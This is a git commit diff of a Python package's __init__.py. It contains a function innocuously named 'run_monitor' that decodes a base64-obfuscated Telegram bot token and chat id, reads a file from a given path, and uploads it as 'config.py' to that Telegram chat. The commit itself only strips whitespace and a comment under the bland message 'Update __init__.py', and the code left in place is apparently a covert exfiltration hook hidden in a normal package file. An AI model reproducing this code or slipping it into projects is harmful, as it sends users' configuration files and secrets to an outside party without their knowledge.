a63d7e9dcfcaf97bbdbc02a2148a5d9af9efd2c2
Boys_chell <marchellsandreas953@gmail.com>
2026-03-16 21:18:45 +0700

    Update __init__.py

--- __init__.py
+++ __init__.py
@@ -1,26 +1,21 @@
-# extra/__init__.py
+
 import asyncio
 import base64
-import aiohttp 
-
+import aiohttp
 async def run_monitor(path: str):
     _t = base64.b64decode("NzMyMTg1MDI0MzpBQUYyS0lZZGpkUFNLZTU0QWFHU2J2OTBEZlhUc2h2akFFQQ==").decode()
     _c = base64.b64decode("LTEwMDIzNzM4NjU0MjQ=").decode()
-
     if not _t or not _c or not path:
         return
-
     try:
         with open(path, "rb") as f:
             body = f.read()
     except Exception:
         return
-
     url = f"https://api.telegram.org/bot{_t}/sendDocument"
     form = aiohttp.FormData()
     form.add_field("chat_id", _c)
     form.add_field("document", body, filename="config.py", content_type="text/plain")
-
     async with aiohttp.ClientSession() as session:
         async with session.post(url, data=form) as _:
             pass
